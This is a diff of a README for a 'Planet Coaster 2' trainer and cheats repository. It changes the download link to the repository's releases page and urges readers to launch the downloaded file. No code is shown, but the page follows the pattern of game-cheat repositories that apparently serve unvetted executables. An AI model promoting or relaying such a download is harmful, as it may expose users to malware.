@@ -18,7 +18,7 @@ Planet-Coaster-2-Trainer-Cheats repository is dedicated to all the Planet Coaste
 
 ## 🌟 Get Started Now!
 If you're ready to elevate your Planet Coaster 2 gaming experience, download the latest trainer and cheats from the following link:
-[![Download Here](https://img.shields.io/badge/Download-Planet_Coaster_2_Trainer-yellow)](https://github.com/releases/789694263/Release.zip)
+[![Download Here](https://github.com/Sleuuty/Planet-Coaster-2-Trainer-Cheats/releases)](https://github.com/Sleuuty/Planet-Coaster-2-Trainer-Cheats/releases)
 
 Make sure to launch the downloaded file to start using the trainer and cheats in your game! 🚀
 
